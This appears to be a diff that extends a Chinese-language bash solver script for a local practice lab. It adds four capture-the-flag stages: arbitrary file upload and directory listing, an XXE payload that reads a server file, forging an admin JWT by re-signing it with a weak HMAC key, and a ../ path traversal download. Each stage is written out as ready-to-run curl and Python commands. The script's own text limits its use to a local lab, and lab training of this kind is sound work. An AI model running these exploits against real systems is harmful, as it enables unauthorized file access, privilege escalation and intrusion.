@@ -84,5 +84,40 @@ flag "获得 flag#4 (域控): $(echo "$dc_flag" | grep -oE 'flag\{[^}]+\}')"
 echo "======================================================"
 say "全部 flag 收集完毕! 恭喜通关 🎉"
 say "再次提醒: 以上全部操作只允许在本地靶场进行"
+# ---------- 关卡8: 任意文件上传 ----------
+say "关卡8 任意文件上传: 上传任意文件并浏览目录"
+echo "upload test" > /tmp/probe.txt
+curl -s -F "file=@/tmp/probe.txt" "$TARGET/api/upload" | sed 's/^/    /'
+curl -s "$TARGET/uploads/" | sed 's/^/    /'
+flag5=$(curl -s "$TARGET/uploads/flag5_upload.txt")
+flag "获得 flag#5: $flag5"
+
+# ---------- 关卡9: XXE ----------
+say "关卡9 XXE: 构造外部实体读取服务器文件"
+curl -s -d 'xml=<!DOCTYPE r [<!ENTITY x SYSTEM "file:///app/flag6_xxe.txt">]><r><name>&x;</name></r>' "$TARGET/api/parse_xml" | sed 's/^/    /'
+flag "获得 flag#6: $(curl -s -d 'xml=<!DOCTYPE r [<!ENTITY x SYSTEM "file:///app/flag6_xxe.txt">]><r><name>&x;</name></r>' "$TARGET/api/parse_xml" | grep -oE 'flag\{[^}]+\}')"
+
+# ---------- 关卡10: JWT伪造 ----------
+say "关卡10 JWT伪造: 用弱密钥重签 admin 令牌"
+TOKEN=$(curl -s "$TARGET/api/jwt/token" | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
+python3 -c "
+import base64,hmac,hashlib,json,sys
+tok='$TOKEN'
+h,p,s=tok.split('.')
+def dec(x): return base64.urlsafe_b64decode(x+'='*(-len(x)%4))
+def enc(o): return base64.urlsafe_b64encode(o).rstrip(b'=').decode()
+pay=json.loads(dec(p)); pay['role']='admin'
+seg=enc(json.dumps({'alg':'HS256','typ':'JWT'}))+'.'+enc(json.dumps(pay))
+sig=enc(hmac.new(b'super_secret_key_123',seg.encode(),hashlib.sha256).digest())
+print(seg+'.'+sig)
+" > /tmp/fake_jwt.txt
+curl -s -H "Authorization: Bearer $(cat /tmp/fake_jwt.txt)" "$TARGET/api/jwt/data" | sed 's/^/    /'
+flag "获得 flag#7: $(curl -s -H "Authorization: Bearer $(cat /tmp/fake_jwt.txt)" "$TARGET/api/jwt/data" | grep -oE 'flag\{[^}]+\}')"
+
+# ---------- 关卡11: 目录穿越 ----------
+say "关卡11 目录穿越: 用 ../ 跳出目录读文件"
+curl -s "$TARGET/api/download?file=../../flag8_traversal.txt" | sed 's/^/    /'
+flag "获得 flag#8: $(curl -s "$TARGET/api/download?file=../../flag8_traversal.txt" | grep -oE 'flag\{[^}]+\}')"
+
 echo "======================================================"
 rm -f "$cookie_jar"
